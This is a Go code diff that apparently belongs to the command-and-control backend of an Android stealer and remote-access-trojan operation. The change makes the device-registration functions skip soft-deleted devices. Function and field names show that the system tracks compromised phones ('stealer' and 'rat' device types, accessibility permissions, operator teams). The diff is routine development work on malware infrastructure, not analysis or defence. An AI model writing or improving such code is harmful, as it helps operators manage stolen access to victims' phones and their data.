@@ -598,8 +598,11 @@ func resolveDeviceTeam(deviceTeamID string) string {
 
 func ensureStealerDevice(deviceID, teamID string) {
 	db.DB.Exec("INSERT OR IGNORE INTO teams (id, name) VALUES (?, ?)", teamID, "team_"+teamID)
-	var exists int
-	db.DB.QueryRow("SELECT COUNT(*) FROM devices WHERE device_id = ?", deviceID).Scan(&exists)
+	var exists, isDeleted int
+	db.DB.QueryRow("SELECT COUNT(*), COALESCE(MAX(deleted),0) FROM devices WHERE device_id = ?", deviceID).Scan(&exists, &isDeleted)
+	if isDeleted == 1 {
+		return
+	}
 	if exists == 0 {
 		db.DB.Exec(
 			`INSERT INTO devices (id, device_id, team_id, model, android_version, country, is_online, battery_level, device_type, permissions, last_seen, created_at)
@@ -608,7 +611,7 @@ func ensureStealerDevice(deviceID, teamID string) {
 		)
 		return
 	}
-	db.DB.Exec(`UPDATE devices SET team_id = ?, is_online = 1, last_seen = CURRENT_TIMESTAMP WHERE device_id = ?`, teamID, deviceID)
+	db.DB.Exec(`UPDATE devices SET team_id = ?, is_online = 1, last_seen = CURRENT_TIMESTAMP WHERE device_id = ? AND COALESCE(deleted,0) = 0`, teamID, deviceID)
 }
 
 func ensureDeviceExists(deviceID, teamID string, width, height int) {
@@ -616,8 +619,11 @@ func ensureDeviceExists(deviceID, teamID string, width, height int) {
 
 	perms := `{"accessibility":true}`
 
-	var exists int
-	db.DB.QueryRow("SELECT COUNT(*) FROM devices WHERE device_id = ? AND team_id = ?", deviceID, teamID).Scan(&exists)
+	var exists, isDeleted int
+	db.DB.QueryRow("SELECT COUNT(*), COALESCE(MAX(deleted),0) FROM devices WHERE device_id = ? AND team_id = ?", deviceID, teamID).Scan(&exists, &isDeleted)
+	if isDeleted == 1 {
+		return
+	}
 	if exists == 0 {
 		db.DB.Exec(
 			`INSERT INTO devices (id, device_id, team_id, model, android_version, country, is_online, battery_level, device_type, permissions, last_seen, created_at)
@@ -628,7 +634,7 @@ func ensureDeviceExists(deviceID, teamID string, width, height int) {
 	}
 
 	db.DB.Exec(
-		`UPDATE devices SET team_id = ?, is_online = 1, device_type = 'rat', permissions = ?, last_seen = CURRENT_TIMESTAMP WHERE device_id = ?`,
+		`UPDATE devices SET team_id = ?, is_online = 1, device_type = 'rat', permissions = ?, last_seen = CURRENT_TIMESTAMP WHERE device_id = ? AND COALESCE(deleted,0) = 0`,
 		teamID, perms, deviceID,
 	)
 }
